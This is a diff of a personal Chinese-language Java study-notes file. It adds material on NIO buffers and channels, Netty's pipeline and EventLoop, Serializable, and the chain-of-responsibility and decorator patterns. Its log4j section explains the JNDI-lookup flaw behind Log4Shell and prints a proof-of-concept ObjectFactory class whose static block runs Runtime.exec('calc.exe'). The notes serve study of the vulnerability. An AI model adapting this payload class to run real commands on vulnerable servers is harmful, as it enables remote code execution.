@@ -10,6 +10,7 @@
 | Ctrl + Alt + T   | 对选中的代码弹出环绕选项弹出层 （比如增加try-catch块）       |
 | Ctrl + Shift + / | 代码块注释                                                   |
 | Ctrl + Shift + U | 对选中的代码进行大 / 小写轮流转换 （必备）                   |
+| ctrl+H           | 生成类图                                                     |
 
 
 
@@ -31,9 +32,33 @@
 
 ### log4j漏洞
 
-利用log4j
+jndi：java命名和目录接口，通过jndi可以在网络上查找对应名字的类等资源。
 
+==该漏洞利用log4j的递归解析，使得jdni触发，并且导致被攻击服务器从其他不安全的地方下载了class文件到本地执行==
 
+![1639486971846](java.assets/1639486971846.png)
+
+![1639490131296](java.assets/1639490131296.png)
+
+```java
+public class BugHa implements ObjectFactory{
+    static {
+        System.out.println("黑客入侵");
+        try {
+            Process p  = Runtime.getRuntime().exec("calc.exe");
+            p.waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+        System.out.println("黑客植入的class");
+        return new BugHa();
+    }
+}
+```
 
 
 
@@ -124,6 +149,26 @@ Collection是集合类上层接口
 ![1637155070663](java.assets/1637155070663.png)
 
 Colletions是集合类帮助类，里面写好了很多帮助方法，类似于Executors类
+
+
+
+
+
+#### Serializable
+
+记住网络传输java对象一定要实现Serializable
+
+
+
+Serializable接口是序列化接口，何为序列化
+
+序列化就是把java对象转换为字节流对象方便在网络上传输
+
+==本质上Serializable只是一个标识，用户层面只需要implements就可以了，实际是告诉jvm来处理==
+
+java建议用户需要自己顶一个serialVersionUID变量在类中，当然自己不定义java也会默认给一个，但是默认的对class细节敏感
+
+
 
 ### 代理
 
@@ -1135,9 +1180,28 @@ nio下的read和write是非租塞的，系统通过selector的select方法来轮
 
 
 
-##### ByteBuffer
+NIO三大核心：buffer、channel和Selector
 
-重要属性
+1. 每个Channel对应Buffer
+2. 一个Selector对应一个线程，一个线程对应多个Channel
+3. 执行哪个Channel由事件Event确定
+4. Buffer本质就是内存块，底层是数组
+5. 客户端不是把数据直接写到通道，同时客户端也不是直接从通道读取数据，而是把数据写到缓冲区再传到通道，或者从通道读取到缓冲区
+6. Channel和Buffer都是双向的
+
+![1639983683695](java.assets/1639983683695.png)
+
+##### Selector
+
+多个Channel以事件的方式注册到Selector中，Selector按事件来进行相应处理,事件类型对应SelectionKey，根据SelctionKey来找到对应Channel
+
+
+
+
+
+##### Buffer
+
+java在NIO中引入的类型，重要属性
 
 | mark     | 记录了当前标记索引下标       |
 | -------- | ---------------------------- |
@@ -1148,23 +1212,224 @@ nio下的read和write是非租塞的，系统通过selector的select方法来轮
 
 
 
-
-
-
-
-是java在NIO中引入的类型，本质是对字符数组的封装
+==ByteBuff是最重要的子类，本质是对字符数组的封装==
 
 ByteBuffer.allocate()和ByteBuffer.wrap()对无效内容的字符数组创建的ByteBuffer是写模式，等待程序写入元素
 
 对有效内容的时候是读模式，等待程序读取元素
 
-ByteBuffer.flip()转换ByteBuffer为读模式
+ByteBuffer.flip()转换ByteBuffer为读模式，limit变成写模式下的position，并会把position值为0
 
 ByteBuffer.clear()转换为写模式
 
 ByteBuffer.hasRemaining()可以知道是否还有写模式的空间或者读模式数据可用
 
 
+
+##### Channel
+
+BIO中的流是单向的，而NIO中的Channel是双向的
+
+常见的Channel子类有：
+
+- FileChannel：用于文件数据读写
+- DatagramChannel：用于UDP的数据读写
+- ServerSocketChannel和SocketChannel用于TCP数据读写
+
+
+
+用FIleChannel举个例子，往文件写入数据
+
+```java
+public class FileChannel01 {
+    public static void main(String[] args) throws Exception{
+        String msg = "Hello,Liquid";
+        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\ASUS\\Desktop\\hello.txt");
+        FileChannel channel = fileOutputStream.getChannel();
+
+        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);
+        byteBuffer.put(msg.getBytes());
+
+        byteBuffer.flip();
+        channel.write(byteBuffer);
+
+        fileOutputStream.close();
+
+    }
+}
+```
+
+![1639986175311](java.assets/1639986175311.png)
+
+
+
+#### Netty
+
+BossGroup用来接收客户端连接，WorkerGroup用来处理的读写，并用pipeline管道中的handler来处理业务逻辑
+
+![1640071669262](java.assets/1640071669262.png)
+
+
+
+
+
+##### 三个重要抽象组件
+
+- Channel：代表Socket
+  - NioSocketChannel重要子类
+- EventLoop：处理连接生命周期中所发生的的事件
+- ChannelFuture：异步通知
+
+![1639543712088](java.assets/1639543712088.png)
+
+
+
+
+
+==ChannelHandler和ChannelPipeline==
+
+ChannelHandler充当了处理入站和出站数据的逻辑容器
+
+- ChannelHandlerAdapter
+- ChannelInboundHandlerAdapter
+- ChannelOutboundHandlerAdapter
+- ChannleDuplexHandler
+
+
+
+ChannelPipeline其实就是链表，连接ChannelHandler
+
+![1639543963283](java.assets/1639543963283.png)
+
+##### 引导
+
+引导类为应用程序网络层的配置提供了容器，涉及将一个进程绑定到指定端口（服务器），或者将一个进程连接到另一个运行在某个指定主机端口上的应用（客服端）
+
+上面对应ServerBootStrap和BootStrap
+
+==ServerBootStrap需要两个EventLoopGroup，而BootStrap只需要一个==
+
+原因在于服务器有两组不同的Channel，一组用户绑定本地端口，一组用于处理客户端连接
+
+![1639982194603](java.assets/1639982194603.png)
+
+
+
+##### ByteBuf
+
+Netty自己封装了ByteBuff，内部维护了读位置和写位置，不用像ByteBuff那样用flip来切换模式了
+
+本质就是一个由不同的索引分布控制读访问和写访问的字节数组
+
+![1639569395855](java.assets/1639569395855.png)
+
+
+
+##### write和close
+
+write方法常用有两种ctx.write()和ctx.channel().write()
+
+ctx.write()是从当前handler写到离他最近的out handler
+
+而ctx.channel().write()是从流水线最后一直写到头位置
+
+```java
+//用ctx.channel().write()，从尾部开始
+public final ChannelFuture write(Object msg) {
+        return this.tail.write(msg);
+    }
+//用ctx.write()
+ private void write(Object msg, boolean flush, ChannelPromise promise) {
+        AbstractChannelHandlerContext next = this.findContextOutbound();
+        Object m = this.pipeline.touch(msg, next);
+        EventExecutor executor = next.executor();
+        if (executor.inEventLoop()) {
+            if (flush) {
+                next.invokeWriteAndFlush(m, promise);
+            } else {
+                next.invokeWrite(m, promise);
+            }
+        }
+```
+
+close方法同理
+
+
+
+##### Channel和ChannelHandler生命周期
+
+Channel生命周期包括
+
+1. ChannelUnregistered
+2. ChannelRegistered
+3. ChannelActive（Channel处于连接状态，可以接受和发送数据）
+4. ChannelInactive
+
+
+
+ChannelHandler生命周期
+
+1. handlerAdded（将ChannleHandler添加到ChannlePipeline链中）
+2. handlerRemoved
+3. exceptionCaught
+
+
+
+##### ChannelInboundHandler和ChannelOutboundHandler
+
+包含的方法与Channel的生命周期息息相关，在上面状态的基础上还有读写状态改变
+
+如重写channelRead方法，会显示的释放与池化ByteBuf实例相关的内存
+
+
+
+而他的子类==SimpleChannelInboundHandler==会自动释放里面相应内存
+
+
+
+ChanneloutboundHandler出站操作和数据将由该类负责
+
+
+
+##### 资源管理
+
+在调用handler的read和write方法时候，需要确保没有资源泄露
+
+```java
+ReleaseCountUtil.release(msg);
+```
+
+
+
+##### ChannleHandlerContext
+
+代表了ChannleHandler和ChanlePipeline之间的关联，每当ChannleHannler添加到ChannelPipeline中的时候，都会创建对应的ChannelHandlerContext
+
+与之不同的是，调用Channel和ChannlePipeline上的方法会流动整个传播链
+
+==而调用ChannelHandlerContext会从其对应的ChannelHandler出发，并且只会传播给下一个handler==
+
+
+
+下图是组件之间的关系
+
+![1639967247136](java.assets/1639967247136.png)
+
+1. handlerAdded
+
+##### EventLoop
+
+事件循环，基本思想循环遍历处理所有的事件
+
+下面为EventLoop的类层次结构，基于NIO和并发API上建立
+
+我们看到EventLoop是拥有了任务调度的能力的，并且可以实现了迭代器功能
+
+![1639969389590](java.assets/1639969389590.png)
+
+Netty线程模型的性能在于对当前执行的Thread身份的确定，确定他是否分配给当前Channel以及他的EventLoop的那一线程
+
+如果当前线程是，那么执行提交的代码块，如果不是，加入到队列中
 
 
 
@@ -1431,40 +1696,6 @@ interface A{
 ![img](java.assets/v2-eaba088b240eabe8d30e8dbff4cc1dc5_b.jpg)
 
 
-
-
-
-### WEB发展
-
-单体时代会面临一些高并发和高可用的问题，比如tomcat连接用光，数据库I/O频繁或者挂掉
-
-
-
-
-
-
-
-使用负载均衡技术，采用对服务器复制策略，在一定程度上缓解高并发高可用问题，并且采用redis解决不同服务器session不一致问题
-
-
-
-但每个tomcat都过于臃肿，用户如果在某一时间只对某种服务做出请求，会对服务器其他的服务造成影响
-
-并且维护服务器成本巨大，更改一处代码，所有服务器都需要重新上传运行
-
-
-
-
-
-
-
-对服务进行切分，每个具体服务分到某个tomcat中，采用nginx的反向代理和负载均衡，当访问某个服务时候，nginx会把请求根据轮询机制传到特定服务器上
-
-
-
-
-
-AKF方法论
 
 
 
@@ -2121,7 +2352,7 @@ public class MQAdapter {
 
 
 
-### 迭代器
+### 迭代器模式
 
 java实现迭代器需要实现Collection集合接口，该接口提供了集合能提供的添加删除元素操作，并且Colletion接口继承自Iterable接口
 
@@ -2182,3 +2413,175 @@ class EmployeIterator implements Collection<Employee>{
 
 
 迭代器优点在于能够以相同方式遍历不同的数据结构元素，用户在遍历时候不需要关心内部实现逻辑，做到统一便用，但是在实现上相对要复杂一点。
+
+
+
+### 责任链模式
+
+责任链介绍了请求者处理者之间的耦合程度，减少了代码里的if-else的复杂逻辑关系，请求者不用关心责任链如何传递和处理，只关心处理结果
+
+```java
+public class AuthService {
+    private static Map<String,Integer> map = new HashMap<>();
+
+    public static Integer queryInfo(String name){
+        return map.get(name);
+    }
+
+    public static void doAuth(String name){
+        int num = 0;
+        if(map.get(name)!=null){
+            num = map.get(name);
+        }
+        num++;
+        map.put(name,num);
+    }
+}
+//设计一个父类，让其他责任链继承该父类
+public abstract class AuthLink {
+    protected AuthLink next;
+    protected String levelName;
+    protected Integer levelId;
+
+    public AuthLink(String levelName, Integer levelId) {
+        this.levelName = levelName;
+        this.levelId = levelId;
+    }
+
+    public AuthLink next(){
+        return next;
+    }
+
+    public AuthLink appendNext(AuthLink next){
+        this.next = next;
+        return this;
+    }
+
+    public abstract AuthInfo doAuth(String username);
+}
+//第一个责任节点处理完后交给下一个责任节点
+public class Level1Link extends AuthLink {
+    public Level1Link(String levelName, Integer levelId) {
+        super(levelName, levelId);
+    }
+
+    @Override
+    public AuthInfo doAuth(String username) {
+        Integer integer = AuthService.queryInfo(username);
+        if(integer==1){
+            return new AuthInfo(levelId,"当前级别为"+integer+"，状态为一级审批人审批中，姓名为:"+this.levelName+"。被审批人"+username);
+        }
+        AuthLink next = super.next();
+        if(next == null){
+            return new AuthInfo(levelId+1,"当前级别为"+integer+"，状态为一级审批人完成中，姓名为"+this.levelName+"。被审批人"+username);
+        }
+        if(integer==2){
+            return new AuthInfo(levelId+1,"当前级别为"+integer+"，状态为一级审批人完成中，姓名为"+this.levelName+"。被审批人"+username);
+        }
+        return next.doAuth(username);
+    }
+}
+//创建责任链
+AuthLink authLink = new Level1Link("项目经理",1)
+                .appendNext(new Level2Link("CTO",2))
+                .appendNext(new Level3Link("董事长",3));
+```
+
+==最终输出如下==
+
+```
+15:03:31.093 [main] ERROR design.Design - AuthInfo(code=1, info=当前级别为1，状态为一级审批人审批中，姓名为:项目经理。被审批人刘阳)
+15:03:31.096 [main] ERROR design.Design - AuthInfo(code=2, info=当前级别为2，状态为一级审批人完成中，姓名为项目经理。被审批人刘阳)
+15:03:31.097 [main] ERROR design.Design - AuthInfo(code=3, info=当前级别为3，状态为三级审批人审批中，姓名为:董事长。被审批人刘阳)
+15:03:31.097 [main] ERROR design.Design - AuthInfo(code=4, info=当前级别为4，审批流程完成，姓名为董事长。被审批人刘阳)
+15:03:31.097 [main] ERROR design.Design - AuthInfo(code=4, info=当前级别为5，审批流程完成，姓名为董事长。被审批人刘阳)
+```
+
+
+
+责任链的应用很多，著名的如Netty中的ChannelPipline链，控制网络信息的逻辑处理
+
+
+
+### 装饰器模式
+
+装饰器模式就像在套娃，它的核心在不改变原有类的基础上给类新增功能，当然也可以选择子类集成和AOP切面来完成。但是==子类集成会导致子类过多，AOP切面较为复杂==
+
+装饰器模式解决了直接继承导致的功能不断横向扩展子类膨胀的问题，装饰器更为灵活
+
+装饰器有四点：
+
+1. 定义抽象接口
+2. 实现抽象接口
+3. 抽象装饰角色
+4. 具体装饰角色
+
+```java
+public interface Action {
+    public void doAction();
+}
+//一个实现类
+public class PlayAction implements Action {
+    @Override
+    public void doAction() {
+        System.out.println("该孩子可以玩耍");
+    }
+}
+```
+
+下面在编写装饰角色
+
+```java
+public abstract class NewAction implements Action {
+    private Action action;
+    private NewAction(){
+
+    }
+    public NewAction(Action action) {
+        this.action = action;
+    }
+
+    @Override
+    public void doAction() {
+        this.action.doAction();
+    }
+}
+
+public class SwimActionDecorator extends NewAction{
+    public SwimActionDecorator(Action action) {
+        super(action);
+    }
+
+    @Override
+    public void doAction() {
+        super.doAction();
+        System.out.println("这孩子还选择了游泳");
+    }
+}
+
+public class DotaActionDecorator extends NewAction{
+    public DotaActionDecorator(Action action) {
+        super(action);
+    }
+
+    @Override
+    public void doAction() {
+        super.doAction();
+        System.out.println("该孩子打了dota");
+    }
+}
+
+ @Test
+    public void decorator(){
+        DotaActionDecorator dotaActionDecorator = new DotaActionDecorator(new SwimActionDecorator(new PlayAction()));
+        dotaActionDecorator.doAction();
+    }
+```
+
+==java中字节流这些就是采用了装饰器模式==
+
+```java
+ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+```
+
